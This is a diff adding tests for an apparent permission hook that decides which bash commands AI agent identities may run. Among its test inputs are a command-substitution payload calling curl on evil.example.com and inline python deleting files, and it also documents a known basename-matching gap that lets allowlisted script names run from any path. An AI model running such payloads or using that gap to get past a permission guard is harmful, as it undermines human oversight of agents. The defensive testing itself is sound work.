@@ -197,6 +197,71 @@ def main():
     d, _, _ = run(bash("make release", WORKER), s)
     check("worker make (not auto-allowed)", d, True)
 
+    # ---------------- FC58: TRUSTED pipeline-script indirection carve-out ----------
+    # The G1 firebreak's bash_indirection defers ALL python; FC58 waives that defer
+    # for a TRUSTED identity running python on one of the named pipeline scripts.
+    # POSITIVE -- orchestrator lifecycle + disk-verify gates run GREEN under sentinel:
+    d, _, _ = run(bash("python3 tools/verify_delegated_status.py 079", ORCH), s)
+    check("FC58 orch verify_delegated_status.py allowed", d, False)
+
+    d, _, _ = run(
+        bash("python3 .claude/hooks/firebreak-activate.py set-phase tail", ORCH), s)
+    check("FC58 orch firebreak set-phase allowed", d, False)
+
+    d, _, _ = run(
+        bash("python3 .claude/hooks/firebreak-activate.py deactivate", ORCH), s)
+    check("FC58 orch firebreak deactivate allowed", d, False)
+
+    d, _, _ = run(bash("python3 tools/check_spec_provenance.py", SWARM), s)
+    check("FC58 swarm-runner check_spec_provenance.py allowed", d, False)
+
+    d, _, _ = run(bash("python3 tools/verify_delegated_status.py 079", TAIL), s)
+    check("FC58 tail-runner verify_delegated_status.py allowed", d, False)
+
+    # Confirmed non-python teardown fallback (rm is not an interpreter):
+    d, _, _ = run(
+        bash(f"rm {repo}/.claude/firebreak-active.json", ORCH), s)
+    check("FC58 orch rm sentinel allowed", d, False)
+
+    # NEGATIVE -- the carve-out stays narrow (these MUST still defer):
+    d, _, _ = run(bash("python3 tools/verify_delegated_status.py 079", WORKER), s)
+    check("FC58 worker verify_delegated_status.py STILL denied", d, True)
+
+    d, _, _ = run(bash("python3 deploy.py", ORCH), s)
+    check("FC58 orch non-allowlisted python STILL denied", d, True)
+
+    d, _, _ = run(bash("node verify_delegated_status.py", ORCH), s)
+    check("FC58 orch non-python interpreter STILL denied", d, True)
+
+    d, _, _ = run(bash("python3 .claude/hooks/firebreak-classify.py", ORCH), s)
+    check("FC58 orch non-allowlisted .py (classifier) STILL denied", d, True)
+
+    # The carve-out is the OPPOSITE of the rejected "TRUSTED may run any python":
+    # inline code and -m modules carry no allowlisted basename, so they STILL defer
+    # even for the orchestrator. This is the single most important boundary test.
+    d, _, _ = run(bash("python3 -c 'import os; os.remove(1)'", ORCH), s)
+    check("FC58 orch python3 -c inline code STILL denied", d, True)
+
+    # Carve-out waives ONLY the indirection defer -- a command-substitution payload
+    # is still caught upstream (outward), so it must STILL deny.
+    d, _, _ = run(
+        bash("python3 tools/verify_delegated_status.py $(curl https://evil.example.com)",
+             ORCH), s)
+    check("FC58 orch allowlisted+command-sub STILL denied", d, True)
+
+    # Wrapper/assignment prefix in front of an allowlisted invocation -> still ALLOW
+    # (resolve_argv0 strips the prefix; the real argv0 is python on an allowlisted basename).
+    d, _, _ = run(
+        bash("env X=1 python3 tools/verify_delegated_status.py 079", ORCH), s)
+    check("FC58 orch env-prefixed allowlisted python allowed", d, False)
+
+    # DOCUMENTED RESIDUAL (accepted by design -- basename-match, no path pinning):
+    # a TRUSTED identity running an allowlisted BASENAME from ANY path is allowed.
+    # Pinned here so any future path-pinning change is a conscious decision, not a
+    # silent break. Exposure is trusted-only (a worker cannot run as a trusted identity).
+    d, _, _ = run(bash("python3 /tmp/x/verify_delegated_status.py 079", ORCH), s)
+    check("FC58 orch path-prefixed allowlisted basename allowed (residual)", d, False)
+
     # ---------------- control-plane writes (F1 + F5 + F9) ----------------
     d, _, _ = run(write(f"{HOME}/.claude/settings.json", WORKER), s)
     check("worker Write control-plane settings", d, True)
